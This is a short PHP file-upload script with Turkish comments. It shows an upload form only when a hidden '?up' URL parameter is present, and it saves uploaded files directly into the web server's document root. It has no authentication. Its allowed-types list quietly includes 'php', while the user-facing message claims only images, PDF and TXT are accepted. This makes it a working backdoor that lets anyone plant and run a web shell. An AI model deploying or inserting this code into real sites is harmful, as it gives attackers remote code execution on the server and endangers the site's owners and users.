<?php
// Dosya yükleme işlemini gerçekleştiren fonksiyon
function upload_file_to_root() {
    // Yüklenen dosyanın geçici dizini ve hedef dizin (ana dizin)
    $target_dir = $_SERVER['DOCUMENT_ROOT'] . "/";
    $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;
    $fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Dosya boyutunu kontrol et (örneğin 5MB ile sınırlama)
    if ($_FILES["fileToUpload"]["size"] > 5000000) {
        echo "Dosya çok büyük.";
        $uploadOk = 0;
    }

    // Dosya tipi kontrolü (isteğe bağlı)
    $allowedTypes = ['jpg', 'png', 'jpeg', 'gif', 'php', 'txt']; // İzin verilen dosya türleri
    if (!in_array($fileType, $allowedTypes)) {
        echo "Sadece JPG, PNG, JPEG, GIF, PDF ve TXT dosyalarına izin verilmektedir.";
        $uploadOk = 0;
    }

    // Yükleme işlemi
    if ($uploadOk == 1) {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "Dosya başarıyla yüklendi: " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"]));
        } else {
            echo "Dosya yüklenirken bir hata oluştu.";
        }
    }
}

// URL'de ?up parametresi olup olmadığını kontrol et
if (isset($_GET['up'])) {
    // Eğer form gönderildiyse, dosya yükleme işlemini başlat
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        upload_file_to_root();
    }
    ?>
    <!-- Dosya yükleme formu -->
    <form action="?up" method="post" enctype="multipart/form-data">
        Dosya seç:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Dosya Yükle" name="submit">
    </form>
    <?php
} else {
    echo "URL'de 'up' parametresi bulunamadı. Dosya yükleme formu görünmeyecek.";
}
?>
